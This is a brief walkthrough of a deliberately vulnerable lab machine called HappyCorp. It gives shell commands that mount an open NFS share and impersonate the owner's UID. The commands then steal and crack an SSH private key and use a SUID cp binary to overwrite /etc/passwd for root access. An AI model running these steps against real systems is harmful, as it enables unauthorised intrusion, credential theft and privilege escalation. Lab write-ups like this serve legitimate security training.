# HappyCorp (Creatigon Basic Pentest)

---

- Nmap recon

```
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```sh
$ showmount -e $IP
# /home/karl *
$ sudo mount $IP:/home/karl /tmp/h
$ cd /tmp/h
$ cd .ssh # permission deined
$ ls -la
...
-rw-r--r--  1 karl karl   675 မတ်    5  2019 .profile
drwx------  2 karl karl  4096 မတ်    5  2019 .ssh
-rw-r--r--  1 karl karl   165 ဖေ   19 17:25 .wget-hsts
$ sudo useradd -M -u 1001 karl
$ sudo passwd karl
$ su karl
$ cd .ssh & cat id_rsa
# copy the id_rsa and enter ssh
# passphrase required
$ ./ssh2john.py id_rsa > forjohn
$ john forjohn --wordlist=rockyou.txt
# karl:sheep
# then enter ssh
```

- Inside machine with user, karl via ssh
- get linpeas.sh file in ssh tmp folder and run the script
- SUID

```
-rwsr-xr-x 1 root root 128K Feb 22  2017 /bin/cp
```

- first copy the `/etc/passwd` to `/tmp/passwd`
- in your attack machine or whatever create password hash with openssl

```sh
openssl passwd -1 -salt random_salt passwordtotype
```

- get the password
- edit the passwd file
  - copy the root (first line)
  - replace first word `root`, with your user name
  - replace `x` with the password created before, like in passwd file
  - copy the contents from passwd and create a file like `passwd_edit` in /tmp folder in ssh
- then copy the `passwd_edit` into `/etc/passwd`
- change the user as you named above and get the root access
